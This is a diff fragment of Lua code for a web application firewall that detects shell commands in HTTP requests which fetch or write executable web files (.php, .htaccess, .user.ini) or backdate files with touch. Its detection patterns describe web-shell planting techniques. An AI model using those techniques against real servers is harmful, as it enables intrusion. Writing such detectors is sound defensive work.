+        if w:find("^%-%-date") or w:find("^%-%-reference") then return "TOUCH_BACKDATE" end
+      elseif w:sub(1, 1) == "-" and #w > 1 then
+        if w:find("[dtr]") then return "TOUCH_BACKDATE" end
+      else
+        break
+      end
+    end
+    return nil
+  end
+  if verb == "tee" then
+    for _, w in ipairs(words) do
+      if w:sub(1, 1) ~= "-" and SHW.is_exec(w) then return "REDIRECT_TO_EXEC" end
+    end
+    return nil
+  end
+  if SHW.fetchers[verb] then
+    -- wget with no output option saves under the URL's file name, as curl -O does.
+    local remote_name, had_out = false, false
+    for k, w in ipairs(words) do
+      local out
+      if w:find("^%-%-output%-document=") or w:find("^%-%-output=") then
+        out = w:match("=(.*)$")
+      elseif w == "--output" or w == "--output-document" then
+        out = words[k + 1]
+      elseif w == "--remote-name" then
+        remote_name = true
+      elseif w == "--spider" or w == "--delete-after" then
+        had_out = true                                  -- keeps nothing on disk
+      elseif w:find("^%-%a*o$") then
+        -- -o / -O (one after lowercasing), alone or closing a cluster: a
+        -- file name follows (wget -O x, curl -o x), "-" is stdout (the
+        -- wget -q -O - …/wp-cron.php cron line), or curl -O names the file
+        -- after the URL.
+        local nxt = words[k + 1]
+        had_out = true
+        if nxt and nxt:sub(1, 1) ~= "-" and not nxt:find("^%a+://") then
+          out = nxt
+        elseif nxt ~= "-" then
+          remote_name = true
+        end
+      elseif w:find("^%-%a*o[^%s]") and not w:find("^%-%-") then
+        out = w:match("^%-%a*o(.+)$")                 -- -ox.php
+      end
+      if out then had_out = true end
+      if out and SHW.is_exec(out) then return "FETCH_TO_EXEC" end
+    end
+    if verb == "wget" and not had_out then remote_name = true end
+    if remote_name then
+      for _, w in ipairs(words) do
+        if SHW.url_exec(w) then return "FETCH_TO_EXEC" end
+      end
+    end
+  end
+  if SHW.writers[verb] then
+    for _, t in ipairs(targets) do
+      if SHW.is_exec(t) then return "REDIRECT_TO_EXEC" end
+    end
+  end
+  return nil
+end
+
+-- Does an option (-x, '-x') follow the word ending at from, across blanks
+-- and JSON \t? (touch -d …)
+function SHW.option_next(t, p)
+  local start = p
+  while p - start < 64 do
+    local b = t:byte(p)
+    if SHW.blank[b] then p = p + 1
+    elseif b == 92 and t:byte(p + 1) == 116 then p = p + 2
+    else break end
+  end
+  if p == start then return false end
+  local b = t:byte(p)
+  if b == 34 or b == 39 then b = t:byte(p + 1) end
+  return b == 45
+end
+
+-- One verb's occurrences in t, in order; returns the tag or nil. An
+-- occurrence inside the command this verb's last parse read is an argument of
+-- it, never a command, so one verb's parses never overlap (linear in the
+-- surface), and it parses at most SHW.max_parses commands (each costs ~1.5 us,
+-- whatever its length). Its own function so its loop gets its own JIT trace
+-- (an inner loop under the verb list's loop is blacklisted and runs interpreted).
+SHW.max_parses = 64
+function SHW.scan(t, verb)
+  local parses = 0
+  local fetch, piped = SHW.fetchers[verb], verb == "tee"
+  local at, next_gt, done_to = t:find(verb, 1, true), 0, 0
+  while at do
+    local from = at + #verb
+    local nb, pb = t:byte(from) or 0, t:byte(at - 1)
+    -- The word ends here (python, not pythonic) and starts a command.
+    if at > done_to and not ((nb >= 48 and nb <= 57) or SHW.alpha(nb))
+       and (pb == nil or SHW.lead[pb] or (pb >= 97 and pb <= 122)) then
+      local cmd = SHW.at_command(t, at)
+      if cmd and (not piped or cmd == 124) then          -- tee only after a pipe
+        local go
+        if verb == "touch" then
+          go = SHW.option_next(t, from)                   -- an option must come first
+        elseif fetch or piped then
+          go = true
+        else
+          if next_gt and next_gt < from then next_gt = t:find(">", from, true) end
+          go = next_gt ~= nil and next_gt <= from + SHW.window  -- a writer needs a redirect
+        end
+        if go then
+          local words, targets, stop = SHW.parse(t, from)
+          local tag = SHW.check(verb, words, targets)
+          if tag then return tag end
+          done_to = stop
+          parses = parses + 1
+          if parses >= SHW.max_parses then return nil end
+        end
+      end
+    end
+    at = t:find(verb, from, true)
+  end
+  return nil
+end
+
+-- s: the decoded, lowercased args+body (cfm_waf's get_norm_ab). Read in place:
+-- no copy of the surface.
+function _M.detect_shell_write_exec(s)
+  if not s or s == "" then return nil end
+  -- Every write but touch's needs an executable name somewhere (each plain
+  -- find costs ~6 us on 19 KB, so a body naming none reads touch alone), and
+  -- a writer's needs a redirect.
+  local any_exec = has(s, ".ph") or has(s, ".inc") or has(s, ".htaccess") or has(s, ".user.ini")
+  if not any_exec and not has(s, "touch") then return nil end
+  local any_gt = any_exec and has(s, ">")
+  for _, verb in ipairs(SHW.verbs) do
+    if verb == "touch" or ((SHW.fetchers[verb] or verb == "tee") and any_exec) or any_gt then
+      local tag = SHW.scan(s, verb)
+      if tag then return tag end
+    end
+  end
+  return nil
 end
 
 return _M
